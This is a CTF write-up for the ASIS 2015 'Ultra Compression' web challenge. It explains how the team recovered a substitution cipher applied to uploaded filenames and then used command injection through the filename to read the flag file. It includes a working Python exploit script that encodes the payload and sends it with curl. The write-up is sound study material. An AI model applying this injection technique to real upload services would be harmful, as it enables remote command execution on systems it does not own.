---
layout: post
title: ASIS CTF Finals 2015 - Ultra Compression (Web 125)
author: quanyang
description: "ASIS CTF Finals 2015 Web 125. Ultra Compression Service."
tags: [CTF, WEB, ASIS, INJECTION]
categories: [CTF, WEB, INJECTION]
excerpt: ""
share: true
comments: true
--- 

ASIS CTF 2015 Finals just took place over the weekend of 10,11 October 2015. The finals is open to all, however only qualified teams will be allowed to win the prizes. NUS Greyhats took part in it and solved a few challenges, this is our write-up for some of the challenges from ASIS CTF 2015 Finals. 

# ultra compression
**Points:**125
**Category:** Web

Go [there](http://ucs.asis-ctf.ir/) and find the flag.

---

# Our solution

Here we were told to go to a webpage to find the flag. Going to the webpage shows an ultra compression service with the ability to upload files.

![]({{site.url|append: site.baseurl}}/resources/images/asis/ucs/service.png){: height="auto" width="600px"}

First thing to do is to upload a legitimate file!
I chose a random image file on my machine to upload.

![]({{site.url|append: site.baseurl}}/resources/images/asis/ucs/upload.png){: height="300px" width="300px"}

By viewing all embeded javascript, we can tell that the file is sent using ajax to the uploader php script.

The uploader php script is located at 'ajax_php_file.php'. However, it seems that the file uploaded is not stored on the server.

{% highlight javascript linenos %}

$(document).ready(function (e) {
$("#upload").on('submit',(function(e) {
e.preventDefault();
$("#message").empty();
$('#loading').show(1000);
$.ajax({
url: "ajax_php_file.php", // Url to which the request is send
type: "POST",             // Type of request to be send, called as method
data: new FormData(this), // Data sent to server, a set of key/value pairs (i.e. form fields and values)
contentType: false,       // The content type used when sending data to the server.
cache: false,             // To unable request pages to be cached
processData:false,        // To send DOMDocument or non processed data file it is set to false
success: function(data)   // A function to be called if request succeeds
{
	$('#loading').hide();
	$("#message").hide(1000);
	$("#message").show(500);
	$("#message").html(data);
}
});
}));

{% endhighlight %}

Using the Chrome browser's developer tool, we can inspect the response of the ajax call.

![]({{site.url|append: site.baseurl}}/resources/images/asis/ucs/crypt.png){: height="300px" width="auto"}

As you can see, the filename
`Screen Shot 2015-10-11 at 00.40.02.png`
gets encrypted to
`ow.nnm oOsV G1ig-i1-ii cV 11Jh1J1GJ5my`

Following this finding, we can attempt to map every possible plaintext to their corresponding ciphertext, this gives us the mapping of:

`crypt = "YLyA83tfONHDInmSc7JCb64PBxQaZTRu.viMWj9lhzgwGdeqEV25Kos1Fkp0/Xr"`
`plain = ".0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"`

Attempting to insert a semi-colon into the filename shows that the field was injectable.
![]({{site.url|append: site.baseurl}}/resources/images/asis/ucs/injection.png){: height="200px" width="auto"}

Using a python script to automatically map payload back to their corresponding plaintext, we can then inject commands to the website.

{% highlight python linenos %}
import subprocess,sys

crypt = "YLyA83tfONHDInmSc7JCb64PBxQaZTRu.viMWj9lhzgwGdeqEV25Kos1Fkp0/Xr"
plain = ".0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

mapping = dict()

for x,p in enumerate(plain):
	mapping[crypt[x]] = p

inject = sys.argv[1]

out = ""

for x in inject:
	if x in mapping:
		out = out + mapping[x]
	else:
		out = out + x

print out

cmd = "curl 'http://ucs.asis-ctf.ir/ajax_php_file.php' -H 'Pragma: no-cache' -H 'Origin: http://ucs.asis-ctf.ir' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en;q=0.8,en-US;q=0.6,id;q=0.4' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryes1iD3vHWDOD2gkZ' -H 'Accept: */*' -H 'Cache-Control: no-cache' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: PHPSESSID=' -H 'Connection: keep-alive' -H 'Referer: http://ucs.asis-ctf.ir/' -H 'DNT: 1' --data-binary $'------WebKitFormBoundaryes1iD3vHWDOD2gkZ\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+out+"\"\r\nContent-Type: image/png\r\n\r\n\r\n------WebKitFormBoundaryes1iD3vHWDOD2gkZ--\r\n' --compressed"

p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)

out = p.communicate()
print out
{% endhighlight %}

Traversing to /home/asis/, we can then do a ls to see that the flag.txt is kept there. Finally, using a cat command, we can obtain the flag!

![]({{site.url|append: site.baseurl}}/resources/images/asis/ucs/flag.png){: height="200px" width="auto"}

And we have our flag: **ASIS{72a126946e40f67a04d926dd4786ff15}**